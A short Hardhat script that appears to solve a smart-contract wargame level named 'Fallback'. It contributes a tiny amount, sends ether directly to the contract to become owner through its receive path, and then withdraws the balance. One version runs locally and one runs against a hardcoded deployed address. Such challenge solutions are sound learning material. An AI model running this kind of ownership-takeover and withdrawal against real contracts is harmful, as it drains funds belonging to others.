import { ethers } from "hardhat";

// Run on localhost
async function handleTest() {
  const [me, deployer] = await ethers.getSigners();

  const fallbackFactory = await ethers.getContractFactory("Fallback");
  const fallback = await fallbackFactory.connect(deployer).deploy();

  await fallback.connect(me).contribute({ value: 1 });

  await me.sendTransaction({ to: await fallback.getAddress(), value: 1 });

  console.log(await fallback.owner());

  await fallback.connect(me).withdraw();
}

async function handleReal() {
  const fallback = await ethers.getContractAt(
    "Fallback",
    "0x8A9704af359dEe3435Ae4cf2323750E71c762428"
  );

  const [me] = await ethers.getSigners();

  const contributeTx = await fallback.contribute({ value: 1 });
  await contributeTx.wait();

  const tx = await me.sendTransaction({
    to: await fallback.getAddress(),
    value: 1,
  });
  await tx.wait();

  await fallback.withdraw();
}

// handleTest().catch((error) => {
handleReal().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
